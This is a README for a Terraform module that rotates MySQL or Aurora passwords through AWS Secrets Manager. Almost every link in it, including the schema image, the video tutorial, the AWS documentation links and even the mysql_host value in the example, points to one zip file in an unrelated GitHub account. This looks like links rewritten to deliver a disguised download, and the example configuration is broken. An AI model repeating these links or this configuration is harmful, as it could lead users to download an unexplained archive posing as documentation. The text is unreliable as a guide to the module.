This module will create all the resources to store and rotate a MySQL or Aurora password using the AWS Secrets Manager service.

# Schema

![schema](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)

# Prerequisites
* A VPC with private subnets and accessibilty to AWS Secrets Manager Endpoint, see below for more details.
* An RDS with MySQL or Aurora already created and reacheable from the private subnets


# Usage Example
``` hcl
module "secret-manager-with-rotation" {
  source         = "giuseppeborgese/secret-manager-with-rotation/aws"
  version        = "<always choose the latest version displayed in the upper right corner of this page>"
  name           = "PassRotation"
  rotation_days  = 10
  subnets_lambda = ["subnet-xxxxxx", "subnet-xxxxxx"]
  mysql_username = "giuseppe"
  mysql_dbname   = "my_db_name"
  mysql_host     =  "https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip"
  mysql_password = "dummy_password_will_we_rotated"
}
```

### Video Tutorial
Take a look to the video to see the module in action


[![Rotate automatically a MySQL or Aurora password using AWS Secrets Manager and Terraform](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)


The subnets specified needs to be private and with internet access to reach the [AWS secrets manager endpoint](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)
You can use a NAT GW or configure your Routes with a VPC Endpoint like is described in [this guide](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)

# Further details
* Interesting to [force the rotation](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)

# If you like it
Please if you like this module, thumbs up on the youtube video and leave a comment as well for any questions.
